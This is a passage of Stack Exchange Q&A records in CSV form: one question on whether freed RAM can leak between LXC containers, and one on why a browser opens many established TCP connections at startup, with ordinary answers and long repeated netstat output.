<li>A program can transfer a page of memory to another process via pipe or socket, but this acts more like a copy than a real sharing, especially if the receiving program doesn't try to read it with the same page/byte alignment.</li>
<li>The shared library system is entirely based on multiple processes sharing read only pages of libraries, and obviously, the executables of processes are also shared this way.</li>
</ul>
","83"
"269507","269507","Is RAM wiped before use in another LXC container?","<p><strong>Edit</strong>: though my wording may not be exact, I understand that two containers don't have access to the same memory at the same time. My question is <strong>can one container see data that another has deallocated</strong>?</p>
<p>LXC allows us to over-provision RAM.</p>
<p>I assume this means that if one container needs a bunch of RAM and another container isn't using its allotment, then the unallocated RAM goes to the container that needs it.</p>
<p>Let's say that one container had some private keys loaded, <strong>and that memory was deallocated</strong>, and another container just allocates its maximum heap and starts walking it.</p>
<p>Is there the possibility of reading that private key?</p>
<p><strong>Or is it wiped or otherwise allocated in a way that prevents data leakage?</strong></p>
<p><strong>Where is the documentation that clarifies this?</strong> <br />
(my serach-fu is weak on this - probably because I don't know the right terms)</p>
","50","3","269522","<p>Yes, if memory used by a process in one LXC container is later allocated to another process in another LXC container, the contents will definitely be wiped. This is the case for <em>all</em> processes and has nothing to do with containers.</p>
<p>You asked: &quot;Where is the documentation which clarifies this?&quot; I doubt that there is any specific documentation which addresses your question; if one understands how 'containers' are implemented, then it is obvious.</p>
","4"
"269507","269507","Is RAM wiped before use in another LXC container?","<p><strong>Edit</strong>: though my wording may not be exact, I understand that two containers don't have access to the same memory at the same time. My question is <strong>can one container see data that another has deallocated</strong>?</p>
<p>LXC allows us to over-provision RAM.</p>
<p>I assume this means that if one container needs a bunch of RAM and another container isn't using its allotment, then the unallocated RAM goes to the container that needs it.</p>
<p>Let's say that one container had some private keys loaded, <strong>and that memory was deallocated</strong>, and another container just allocates its maximum heap and starts walking it.</p>
<p>Is there the possibility of reading that private key?</p>
<p><strong>Or is it wiped or otherwise allocated in a way that prevents data leakage?</strong></p>
<p><strong>Where is the documentation that clarifies this?</strong> <br />
(my serach-fu is weak on this - probably because I don't know the right terms)</p>
","50","3","269525","<p>Processes in LXC containers are <strong>normal processes</strong> as far as the Linux kernel is concerned. They are separated from most of the host's resources by using namespaces, which does not make them a special kind of process. This is different from how virtual machines work.</p>
<p><a href=""https://stackoverflow.com/questions/17542601/anonymous-mmap-zero-filled"">When Linux</a> (or another OS) allocates new pages to a process, they are zero-filled.</p>
<p>There is a Linux kernel configuration option that allows a process to ask for non-zero-filled pages, which may contain leftover data from other processes, using the <a href=""https://man7.org/linux/man-pages/man2/mmap.2.html"" rel=""nofollow noreferrer""><code>MAP_UNINITIALIZED</code></a> flag. However, this is very rarely enabled - only for embedded systems where all processes are trustworthy and you need every drop of performance.</p>
","20"
"269265","269265","ESTABLISHED TCP connections after opening browser in linux","<p>I am using <code>netstat -acp | grep ESTABLISHED</code> command to check established connection
between with my system.</p>
<pre><code>$ sudo netstat -acp | grep ESTABLISHED
tcp        0      0 rg-Vostro-3546:51874    server-18-66-78-6:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:58112    199.232.22.137:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:55592    del12s08-in-f1.1e:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:43632    151.101.129.69:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:58128    199.232.22.137:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:48456    server-54-230-112:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:53632    server-18-161-111:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:55602    del12s08-in-f1.1e:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:36772    151.101.129.69:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:47712    server-54-192-111:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:59088    151.101.36.193:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:44872    stackoverflow.com:https ESTABLISHED 2093991/brave --typ 
udp        0      0 rg-Vostro-3546:bootpc   _gateway:bootps         ESTABLISHED 750/NetworkManager  
tcp        0      0 rg-Vostro-3546:51874    server-18-66-78-6:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:58112    199.232.22.137:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:55592    del12s08-in-f1.1e:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:43632    151.101.129.69:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:58128    199.232.22.137:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:48456    server-54-230-112:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:53632    server-18-161-111:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:55602    del12s08-in-f1.1e:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:36772    151.101.129.69:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:47712    server-54-192-111:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:59088    151.101.36.193:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:44872    stackoverflow.com:https ESTABLISHED 2093991/brave --typ 
udp        0      0 rg-Vostro-3546:bootpc   _gateway:bootps         ESTABLISHED 750/NetworkManager  
tcp        0      0 rg-Vostro-3546:51874    server-18-66-78-6:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:58112    199.232.22.137:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:55592    del12s08-in-f1.1e:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:43632    151.101.129.69:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:58128    199.232.22.137:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:48456    server-54-230-112:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:53632    server-18-161-111:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:55602    del12s08-in-f1.1e:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:36772    151.101.129.69:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:47712    server-54-192-111:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:59088    151.101.36.193:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:44872    stackoverflow.com:https ESTABLISHED 2093991/brave --typ 
udp        0      0 rg-Vostro-3546:bootpc   _gateway:bootps         ESTABLISHED 750/NetworkManager  
tcp        0      0 rg-Vostro-3546:51874    server-18-66-78-6:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:58112    199.232.22.137:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:55592    del12s08-in-f1.1e:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:43632    151.101.129.69:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:58128    199.232.22.137:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:48456    server-54-230-112:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:53632    server-18-161-111:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:55602    del12s08-in-f1.1e:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:36772    151.101.129.69:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:47712    server-54-192-111:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:59088    151.101.36.193:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:44872    stackoverflow.com:https ESTABLISHED 2093991/brave --typ 
udp        0      0 rg-Vostro-3546:bootpc   _gateway:bootps         ESTABLISHED 750/NetworkManager  
tcp        0      0 rg-Vostro-3546:51874    server-18-66-78-6:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:58112    199.232.22.137:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:55592    del12s08-in-f1.1e:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:43632    151.101.129.69:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:58128    199.232.22.137:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:48456    server-54-230-112:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:53632    server-18-161-111:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:55602    del12s08-in-f1.1e:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:36772    151.101.129.69:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:47712    server-54-192-111:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:59088    151.101.36.193:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:44872    stackoverflow.com:https ESTABLISHED 2093991/brave --typ 
udp        0      0 rg-Vostro-3546:bootpc   _gateway:bootps         ESTABLISHED 750/NetworkManager  
tcp        0      0 rg-Vostro-3546:51874    server-18-66-78-6:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:58112    199.232.22.137:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:55592    del12s08-in-f1.1e:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:43632    151.101.129.69:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:58128    199.232.22.137:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:48456    server-54-230-112:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:53632    server-18-161-111:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:55602    del12s08-in-f1.1e:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:36772    151.101.129.69:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:47712    server-54-192-111:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:59088    151.101.36.193:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:44872    stackoverflow.com:https ESTABLISHED 2093991/brave --typ 
udp        0      0 rg-Vostro-3546:bootpc   _gateway:bootps         ESTABLISHED 750/NetworkManager  
tcp        0      0 rg-Vostro-3546:51874    server-18-66-78-6:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:58112    199.232.22.137:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:55592    del12s08-in-f1.1e:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:43632    151.101.129.69:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:58128    199.232.22.137:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:48456    server-54-230-112:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:53632    server-18-161-111:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:55602    del12s08-in-f1.1e:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:36772    151.101.129.69:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:47712    server-54-192-111:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:59088    151.101.36.193:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:44872    stackoverflow.com:https ESTABLISHED 2093991/brave --typ 
udp        0      0 rg-Vostro-3546:bootpc   _gateway:bootps         ESTABLISHED 750/NetworkManager  
tcp        0      0 rg-Vostro-3546:51874    server-18-66-78-6:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:58112    199.232.22.137:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:55592    del12s08-in-f1.1e:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:43632    151.101.129.69:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:58128    199.232.22.137:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:48456    server-54-230-112:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:53632    server-18-161-111:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:55602    del12s08-in-f1.1e:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:36772    151.101.129.69:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:47712    server-54-192-111:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:59088    151.101.36.193:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:44872    stackoverflow.com:https ESTABLISHED 2093991/brave --typ 
udp        0      0 rg-Vostro-3546:bootpc   _gateway:bootps         ESTABLISHED 750/NetworkManager  
tcp        0      0 rg-Vostro-3546:51874    server-18-66-78-6:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:58112    199.232.22.137:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:55592    del12s08-in-f1.1e:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:43632    151.101.129.69:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:58128    199.232.22.137:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:48456    server-54-230-112:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:53632    server-18-161-111:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:55602    del12s08-in-f1.1e:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:36772    151.101.129.69:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:47712    server-54-192-111:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:59088    151.101.36.193:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:44872    stackoverflow.com:https ESTABLISHED 2093991/brave --typ 
udp        0      0 rg-Vostro-3546:bootpc   _gateway:bootps         ESTABLISHED 750/NetworkManager
</code></pre>
<p>After opening the browser is establishing the connections with different IP's
<strong>without any website/url being opened</strong>.
Same thing happening for me in Firefox as well.</p>
<ol>
<li>Is it normal for a browser to establish connection like this.?</li>
<li>If not,what should be the steps to get rid of this issue.?</li>
</ol>
","7","3","269266","<p>I'm not going to try and track down the individual connections in that list, but broadly speaking, yeah, it's extremely common for software to automatically make some TCP connections upon starting. Here are a few of the most common reasons:</p>
<ol>
<li>Checking for new versions. Even if you use a package manager rather than letting the app update itself, it might still check to see whether there's an update available (and pop up a message telling you to install it if so).</li>
<li>Checking for updates to extensions/plugins/themes. Browser extensions update automatically (unless you go to some effort to prevent that), and the browser has to connect to the source of each extension (normally they all come from the same source but they don't have to) to see if new versions exist.</li>
<li>Synchronizing across devices. If your browser (or other app) is signed into an account (such as a Google, Microsoft, or Firefox account), and syncs anything (browsing history, open tabs, autocomplete strings, passwords, etc.) then the app will automatically attempt to sync that data when it starts up.</li>
<li>Home page triggering requests. Even through the home page is generally local to the browser (or other app, such as an IDE), it still might make background requests to pull things like news stories, suggested pages, image-of-the-day, or so on.</li>
<li>Extensions that run on the home page triggering requests. Same as the previous point, but the scripts or content elements that trigger the request come from an extension rather than the home page itself.</li>
<li>Extension background pages / plugin initialization code making requests. For example, an ad blocker or privacy enhancer might pull an updated list of content to block, or something like GoLinks might pull the latest list of short URLs that your organization uses. This is distinct from checking for extension updates, because those require publishing a new extension version with (potentially) new code, whereas this step simply pulls new data files and can be done far more often with much less hassle.</li>
<li>Checking for updates to subscribed content. While most browsers no longer feature RSS feed readers, many sites still allow subscribing to various kinds of content that frequently update (e.g. Spotify pulling new podcasts and auto-generated personalized playlists).</li>
<li>Telemetry. Arguably the &quot;worst&quot; of these, but it turns out that almost all serious apps (and quite a few non-serious ones) these days include telemetry to track information about how they're used, including how often they're run and on what sorts of systems. Such functionality - which may be present both in the main app, and in extensions/plugins - generally involves transmitting data which you may or may not have opted into at some point.</li>
<li>For all of the above: checking for the revocation of certificates using Certificate Revocation Lists (CRLs) or Online Certificate Status Protocol (OCSP), both of which are done using TCP connections to the certificate authority (thanks for the reminder @Weirdo).</li>
</ol>
<p>There are probably other cases (and #8 is arguably a few different ones, since there might be a lot things sending telemetry data, to a number of different locations) but that's a good set of example cases.</p>
","26"
"269265","269265","ESTABLISHED TCP connections after opening browser in linux","<p>I am using <code>netstat -acp | grep ESTABLISHED</code> command to check established connection
between with my system.</p>
<pre><code>$ sudo netstat -acp | grep ESTABLISHED
tcp        0      0 rg-Vostro-3546:51874    server-18-66-78-6:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:58112    199.232.22.137:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:55592    del12s08-in-f1.1e:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:43632    151.101.129.69:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:58128    199.232.22.137:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:48456    server-54-230-112:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:53632    server-18-161-111:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:55602    del12s08-in-f1.1e:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:36772    151.101.129.69:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:47712    server-54-192-111:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:59088    151.101.36.193:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:44872    stackoverflow.com:https ESTABLISHED 2093991/brave --typ 
udp        0      0 rg-Vostro-3546:bootpc   _gateway:bootps         ESTABLISHED 750/NetworkManager  
tcp        0      0 rg-Vostro-3546:51874    server-18-66-78-6:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:58112    199.232.22.137:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:55592    del12s08-in-f1.1e:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:43632    151.101.129.69:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:58128    199.232.22.137:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:48456    server-54-230-112:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:53632    server-18-161-111:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:55602    del12s08-in-f1.1e:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:36772    151.101.129.69:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:47712    server-54-192-111:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:59088    151.101.36.193:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:44872    stackoverflow.com:https ESTABLISHED 2093991/brave --typ 
udp        0      0 rg-Vostro-3546:bootpc   _gateway:bootps         ESTABLISHED 750/NetworkManager  
tcp        0      0 rg-Vostro-3546:51874    server-18-66-78-6:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:58112    199.232.22.137:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:55592    del12s08-in-f1.1e:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:43632    151.101.129.69:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:58128    199.232.22.137:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:48456    server-54-230-112:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:53632    server-18-161-111:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:55602    del12s08-in-f1.1e:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:36772    151.101.129.69:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:47712    server-54-192-111:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:59088    151.101.36.193:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:44872    stackoverflow.com:https ESTABLISHED 2093991/brave --typ 
udp        0      0 rg-Vostro-3546:bootpc   _gateway:bootps         ESTABLISHED 750/NetworkManager  
tcp        0      0 rg-Vostro-3546:51874    server-18-66-78-6:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:58112    199.232.22.137:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:55592    del12s08-in-f1.1e:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:43632    151.101.129.69:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:58128    199.232.22.137:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:48456    server-54-230-112:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:53632    server-18-161-111:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:55602    del12s08-in-f1.1e:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:36772    151.101.129.69:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:47712    server-54-192-111:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:59088    151.101.36.193:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:44872    stackoverflow.com:https ESTABLISHED 2093991/brave --typ 
udp        0      0 rg-Vostro-3546:bootpc   _gateway:bootps         ESTABLISHED 750/NetworkManager  
tcp        0      0 rg-Vostro-3546:51874    server-18-66-78-6:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:58112    199.232.22.137:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:55592    del12s08-in-f1.1e:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:43632    151.101.129.69:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:58128    199.232.22.137:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:48456    server-54-230-112:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:53632    server-18-161-111:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:55602    del12s08-in-f1.1e:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:36772    151.101.129.69:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:47712    server-54-192-111:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:59088    151.101.36.193:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:44872    stackoverflow.com:https ESTABLISHED 2093991/brave --typ 
udp        0      0 rg-Vostro-3546:bootpc   _gateway:bootps         ESTABLISHED 750/NetworkManager  
tcp        0      0 rg-Vostro-3546:51874    server-18-66-78-6:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:58112    199.232.22.137:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:55592    del12s08-in-f1.1e:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:43632    151.101.129.69:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:58128    199.232.22.137:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:48456    server-54-230-112:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:53632    server-18-161-111:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:55602    del12s08-in-f1.1e:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:36772    151.101.129.69:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:47712    server-54-192-111:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:59088    151.101.36.193:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:44872    stackoverflow.com:https ESTABLISHED 2093991/brave --typ 
udp        0      0 rg-Vostro-3546:bootpc   _gateway:bootps         ESTABLISHED 750/NetworkManager  
tcp        0      0 rg-Vostro-3546:51874    server-18-66-78-6:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:58112    199.232.22.137:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:55592    del12s08-in-f1.1e:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:43632    151.101.129.69:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:58128    199.232.22.137:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:48456    server-54-230-112:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:53632    server-18-161-111:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:55602    del12s08-in-f1.1e:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:36772    151.101.129.69:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:47712    server-54-192-111:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:59088    151.101.36.193:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:44872    stackoverflow.com:https ESTABLISHED 2093991/brave --typ 
udp        0      0 rg-Vostro-3546:bootpc   _gateway:bootps         ESTABLISHED 750/NetworkManager  
tcp        0      0 rg-Vostro-3546:51874    server-18-66-78-6:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:58112    199.232.22.137:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:55592    del12s08-in-f1.1e:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:43632    151.101.129.69:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:58128    199.232.22.137:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:48456    server-54-230-112:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:53632    server-18-161-111:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:55602    del12s08-in-f1.1e:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:36772    151.101.129.69:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:47712    server-54-192-111:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:59088    151.101.36.193:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:44872    stackoverflow.com:https ESTABLISHED 2093991/brave --typ 
udp        0      0 rg-Vostro-3546:bootpc   _gateway:bootps         ESTABLISHED 750/NetworkManager  
tcp        0      0 rg-Vostro-3546:51874    server-18-66-78-6:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:58112    199.232.22.137:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:55592    del12s08-in-f1.1e:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:43632    151.101.129.69:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:58128    199.232.22.137:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:48456    server-54-230-112:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:53632    server-18-161-111:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:55602    del12s08-in-f1.1e:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:36772    151.101.129.69:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:47712    server-54-192-111:https ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:59088    151.101.36.193:https    ESTABLISHED 2093991/brave --typ 
tcp        0      0 rg-Vostro-3546:44872    stackoverflow.com:https ESTABLISHED 2093991/brave --typ 
udp        0      0 rg-Vostro-3546:bootpc   _gateway:bootps         ESTABLISHED 750/NetworkManager
</code></pre>
<p>After opening the browser is establishing the connections with different IP's
